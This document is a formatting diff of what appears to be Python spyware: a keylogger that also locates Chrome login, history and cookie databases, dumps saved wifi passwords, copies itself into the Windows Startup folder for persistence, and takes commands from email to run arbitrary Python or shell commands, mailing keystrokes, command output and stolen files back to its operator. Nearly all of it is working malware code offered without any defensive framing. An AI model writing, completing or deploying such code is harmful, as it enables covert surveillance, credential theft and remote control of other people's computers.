@@ -35,15 +35,15 @@ def logprint(text, overwrite=False):
 def on_press(event):
     global log, typed_string
     logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
-    event_dict = {"space":" ",
-                  "enter":"\n",
-                  "tab":"\t",
-                  "backspace":"\b",
-                  "unknown":f"[Code {event.scan_code}]"}
-    if len(event.name)>1:
+    event_dict = {"space": " ",
+                  "enter": "\n",
+                  "tab": "\t",
+                  "backspace": "\b",
+                  "unknown": f"[Code {event.scan_code}]"}
+    if len(event.name) > 1:
         if event.name in event_dict.keys():
             name = event_dict[event.name]
-        #elif event.name == "unknown":
+        # elif event.name == "unknown":
         #    name = f"[Code {event.code}]"
         else:
             name = f"[{event.name.title()}]"
@@ -63,11 +63,13 @@ def get_chrome_data():
         history_db_path = path.join(data_path, 'History')
         cookie_db_path = path.join(data_path, 'Cookies')
     except Exception as e:
-        error_text = ("ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
+        error_text = (
+            "ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
         logprint(error_text)
     else:
         logprint("INFO: Successfully retrieved chrome data.\n")
         return [login_db_path, history_db_path, cookie_db_path]
+
 
 def get_wifi_data():
     ''' Returns a list of all known wifi credentials'''
@@ -99,22 +101,27 @@ def get_wifi_data():
                 credential_set["Key"] = "[Unknown]"
             finally:
                 credentials_list.append(credential_set)
-        file_path = "{}/wifi.json".format(path.expanduser('~').replace('\\', '/'))
+        file_path = "{}/wifi.json".format(
+            path.expanduser('~').replace('\\', '/'))
         logprint(f"INFO: Writing data to {file_path}\n")
-        with open(file_path,"w") as file:
-            file.write(credentials_list) 
+        with open(file_path, "w") as file:
+            file.write(credentials_list)
     except Exception as e:
-        error_text = (f"ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
+        error_text = (
+            f"ERROR: An error occured during retrieval. see traceback below:\n{type(e)}\n{str(e)}\n")
         logprint(error_text)
     else:
         logprint("INFO: Successfully retrieved wifi data.\n")
         return file_path
 
+
 def make_persistent(current_file_name):
     '''Adds program to Startup Files, making it persist after reboots.'''
     logprint("INFO: Attempting to become persistent...")
-    current_file_path = "{}/{}".format(getcwd().replace('\\','/'),current_file_name)
-    new_file_path = "{}/{}".format(path.expanduser('~').replace('\\', '/'),"AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
+    current_file_path = "{}/{}".format(getcwd().replace('\\',
+                                       '/'), current_file_name)
+    new_file_path = "{}/{}".format(path.expanduser('~').replace(
+        '\\', '/'), "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
     try:
         command_output = check_output(
             f"cp {current_file_path} {new_file_path}")
@@ -125,6 +132,7 @@ def make_persistent(current_file_name):
     else:
         logprint("INFO: Successfully made program persistent")
 
+
 def run_command_order(email_body):
     logprint(f"INFO: Command text is as follows, scraping:{email_body}\n")
     # Extract the list
@@ -132,20 +140,24 @@ def run_command_order(email_body):
     command_order = command_order[2]
     command_order = command_order.partition(']')
     command_order = command_order[0]
-    command_order = command_order.replace('"','').replace("=3D","=").split(",")
+    command_order = command_order.replace(
+        '"', '').replace("=3D", "=").split(",")
 
     logprint(f"INFO: Command order is as follows, parsing:{command_order}")
-    if command_order[0]=="local":
+    if command_order[0] == "local":
         logprint("INFO: Detected local command, running accordingly")
         results = str(exec(f"{command_order[1]}"))
-    if command_order[0]=="os":
+    if command_order[0] == "os":
         logprint("INFO: Detected global command, running accordingly")
-        results = check_output(command_order[1].split()).decode('utf-8', errors="backslashreplace") 
+        results = check_output(command_order[1].split()).decode(
+            'utf-8', errors="backslashreplace")
 
     logprint("INFO: Ran given command, sending output.")
-    send_results(message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")
+    send_results(
+        message_text=f'Command order "{command_order}" outputed the following:\n{results}', subject=f"Command output from {ID}")
 
-def send_results(message_text="",file_paths=None, subject=f"Report from {ID}"):
+
+def send_results(message_text="", file_paths=None, subject=f"Report from {ID}"):
     print("INFO: Running sending check...")
     global log, typed_string
     if log != "" or message_text != "":
@@ -155,21 +167,22 @@ def send_results(message_text="",file_paths=None, subject=f"Report from {ID}"):
         msg = MIMEMultipart()
         msg['From'] = SENDER
         msg['To'] = ",".join(RECEIVERS)
-        msg['Subject'] = subject#f"Report from {ID}"
+        msg['Subject'] = subject  # f"Report from {ID}"
 
         if message_text != "":
-            body = message_text 
+            body = message_text
         else:
             body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
         msg.attach(MIMEText(body, 'plain'))
 
         if file_paths:
             for file in file_paths:
-                attachement = open(file, 'rb')
+                attachment = open(file, 'rb')
                 p = MIMEBase('application', 'octet-stream')
                 p.set_payload((attachment).read())
                 encoders.encode_base64(p)
-                p.add_header('Content-Disposition', f'attachment; filename={file}')
+                p.add_header('Content-Disposition',
+                             f'attachment; filename={file}')
                 msg.attach(p)
 
         text = msg.as_string()
@@ -189,7 +202,7 @@ def send_results(message_text="",file_paths=None, subject=f"Report from {ID}"):
             logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
             try:
                 server.sendmail(SENDER, RECEIVERS, text)
-                    
+
             except Exception as e:
                 logprint(
                     f"ERROR: Couldn't send mail, see error traceback below\n{type(e)}\n{str(e)}\n"
@@ -199,9 +212,10 @@ def send_results(message_text="",file_paths=None, subject=f"Report from {ID}"):
                 logprint("INFO: Mailing successful.\n")
                 server.quit()
                 logprint('INFO: Cleared "log" variable.\n')
-                logprint("",overwrite=True)
+                logprint("", overwrite=True)
     else:
         print("INFO: No new keyboard input.\n")
+
 
 def fetch_commands():
     print("INFO: Running new command check...\n")
@@ -222,14 +236,16 @@ def fetch_commands():
         try:
             server.select('INBOX')
 
-            status, response = server.search(None, f'(FROM "{SENDER}" SUBJECT "Command for {ID}" UNSEEN)')
+            status, response = server.search(
+                None, f'(FROM "{SENDER}" SUBJECT "Command for {ID}" UNSEEN)')
             unread_msg_nums = response[0].split()
             print(f"INFO: Found {len(unread_msg_nums)} new command emails\n")
-            if len(unread_msg_nums)==0:
+            if len(unread_msg_nums) == 0:
                 print("INFO: No commands to run\n")
             else:
                 logprint("INFO: Running only first command\n")
-                _, response = server.fetch(unread_msg_nums[0], '(UID BODY[TEXT])')
+                _, response = server.fetch(
+                    unread_msg_nums[0], '(UID BODY[TEXT])')
                 # Mark it as seen
                 run_command_order(response[0][1].decode("utf-8"))
                 server.store(unread_msg_nums[0], '+FLAGS', '\Seen')
@@ -243,10 +259,11 @@ def fetch_commands():
             print("INFO: Check successful.\n")
             server.close()
 
+
 keyboard.on_press(on_press)
-#get_chrome_data()
-#get_wifi_data()
-#make_persistent()
+# get_chrome_data()
+# get_wifi_data()
+# make_persistent()
 while 1:
     fetch_commands()
     sleep(SENDING_INTERVAL)
